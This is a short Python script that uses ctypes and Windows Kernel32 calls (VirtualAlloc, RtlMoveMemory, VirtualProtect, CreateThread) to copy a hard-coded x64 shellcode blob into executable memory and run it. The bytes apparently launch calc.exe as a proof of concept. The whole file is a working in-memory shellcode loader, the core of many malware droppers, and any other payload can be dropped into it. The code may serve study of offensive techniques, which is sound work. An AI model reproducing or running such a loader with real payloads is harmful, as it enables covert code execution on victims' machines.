# 12.2.2023 - By BMT
# Used API VirtualAlloc
# - RtlMoveMemory
# - VirtualProtect
# - WaitForSingleObject
# - CreateThread



import ctypes

from ctypes.wintypes import DWORD, PDWORD


k_handle = ctypes.WinDLL("Kernel32.dll")

# shell code for running calc.exe
shellcode =  b""
shellcode += b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51"
shellcode += b"\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52"
shellcode += b"\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72"
shellcode += b"\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0"
shellcode += b"\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
shellcode += b"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b"
shellcode += b"\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
shellcode += b"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44"
shellcode += b"\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41"
shellcode += b"\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
shellcode += b"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1"
shellcode += b"\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44"
shellcode += b"\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
shellcode += b"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
shellcode += b"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
shellcode += b"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
shellcode += b"\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48"
shellcode += b"\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d"
shellcode += b"\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5"
shellcode += b"\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"
shellcode += b"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
shellcode += b"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89"
shellcode += b"\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"




# decalare necessary variable
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_READ_EXECUTE = 0x20

PAGE_EXECUTE_READWRITE = 0x40

# convert to the c style string buffer object
shellcode = ctypes.create_string_buffer(shellcode)
# print(shellcode)

# length of the shellcode
length = len(shellcode)


# By default, functions will return the c int type. We can use restype to use other return types.
k_handle.VirtualAlloc.restype = ctypes.c_void_p

# k_handle.RtlMoveMemory.argtypes = (ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t)



# allocate the memory buffer for payload
my_payload_mem = k_handle.VirtualAlloc(0, length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
print("[INFO] The Memory Was Allocated!...")


# copy the payload to the memory buffer
k_handle.RtlMoveMemory(ctypes.c_void_p(my_payload_mem), shellcode, ctypes.c_size_t(length))
print("[INFO] The Shellcode Was Loaded to The Memory!...")


old = ctypes.c_long(2)

# make a new buffer as executable
rv = k_handle.VirtualProtect(ctypes.c_void_p(my_payload_mem), length, PAGE_READ_EXECUTE, ctypes.byref(old))

if ( rv != 0 ): 

    # run payload
    thread = k_handle.CreateThread(0, 0, ctypes.c_void_p(my_payload_mem), 0, 0, 0)
    k_handle.WaitForSingleObject(thread, 0xFFFFFFFF)
    
    

# Error Ref: 